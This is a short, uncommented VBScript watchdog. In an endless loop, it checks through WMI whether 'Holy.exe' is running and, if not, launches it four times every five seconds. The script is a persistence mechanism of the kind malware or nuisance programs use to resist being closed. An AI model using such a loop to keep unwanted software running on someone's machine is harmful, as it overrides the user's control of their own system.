Do
    Dim objShell
    Set objShell = WScript.CreateObject("WScript.Shell")

    If Not ProcessRunning("Holy.exe") Then
        Dim Path
        Path = Replace(WScript.ScriptFullName, WScript.ScriptName, "") & "Holy.exe"
        objShell.Run ".\Holy.exe"
        objShell.Run ".\Holy.exe"
        objShell.Run ".\Holy.exe"
        objShell.Run ".\Holy.exe"
    End If
    WScript.Sleep 5000

Loop While True

Function ProcessRunning(processName)
    Dim colProcesses, objProcess

    Set colProcesses = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process")

    For Each objProcess in colProcesses
        If InStr(objProcess.Name, processName) > 0 Then
            ProcessRunning = True
            Exit Function
        End If
    Next

    ProcessRunning = False
End Function